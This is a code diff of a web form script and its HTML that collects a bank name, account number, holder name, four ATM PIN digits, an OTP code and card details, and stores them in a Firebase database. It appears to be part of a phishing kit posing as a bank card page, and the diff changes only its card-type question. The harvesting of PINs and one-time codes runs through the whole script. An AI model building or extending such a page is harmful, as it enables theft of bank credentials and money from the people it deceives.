@@ -35,7 +35,6 @@ const db = getDatabase(app);
 var bnName = document.getElementById("Bank-Name");
 var accNum = document.getElementById("Accountnumber");
 var Acchold = document.getElementById("Client-Name");
- var debit = document.getElementById("css");
 var credit = document.getElementById("html");
 // card
 var card = document.getElementById("tems");
@@ -77,8 +76,8 @@ Atmpin2:atm2.value,
 Atmpin3:atm3.value,
 Atmpin4:atm4.value,
 otpcode1:Otp1.value,	
-CardType1:credit.value,
-CardType:debit.value
+creditCard:credit.value
+
 
    })
    .then(()=>{
@@ -294,11 +293,10 @@ next.addEventListener('click', insertData);
 
 
 <div class="mada">	<div class="container">
-	<p>Please select your Card type:</p>
+	<p>Please Indicate if using Credit Card type:</p>
   <input type="radio" id="html" name="Card" >
   <label for="html">Credit </label>
-  <input type="radio" id="css" name="Card" >
-  <label  for="css">Debit</label><br>
+<br>
 
 		<p class="mile">Enter your card details</p>
  
